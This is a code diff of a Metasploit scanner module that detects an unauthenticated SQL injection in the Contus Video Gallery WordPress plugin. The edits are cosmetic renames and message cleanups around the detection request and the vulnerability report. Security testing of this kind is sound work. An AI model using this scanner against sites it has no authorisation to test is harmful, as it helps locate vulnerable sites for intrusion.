@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
@@ -13,7 +13,7 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Contus Video Gallery Unauthenticated SQL Injection Scanner',
+      'Name'        => 'WordPress Contus Video Gallery Unauthenticated SQL Injection Scanner',
       'Description' => %q{
       This module attempts to exploit a UNION-based SQL injection in Contus Video
       Gallery for Wordpress version 2.7 and likely prior in order if the instance is
@@ -38,7 +38,7 @@ class Metasploit4 < Msf::Auxiliary
     left_marker = Rex::Text.rand_text_alpha(5)
     flag = Rex::Text.rand_text_alpha(5)
 
-    vprint_status("#{peer} - Checking host")
+    vprint_status("Checking host")
 
     res = send_request_cgi({
       'uri'       => wordpress_url_admin_ajax,
@@ -49,14 +49,14 @@ class Metasploit4 < Msf::Auxiliary
       }
     })
     unless res && res.body
-      vprint_error("#{peer} - Server did not respond in an expected way")
+      vprint_error("Server did not respond in an expected way")
       return
     end
 
     result = res.body =~ /#{left_marker}#{flag}#{right_marker}/
 
     if result
-      print_good("#{peer} - Vulnerable to unauthenticated SQL injection within Contus Video Gallery 2.7 for Wordpress")
+      print_good("Vulnerable to unauthenticated SQL injection within Contus Video Gallery 2.7 for Wordpress")
       report_vuln({
         :host  => rhost,
         :port  => rport,
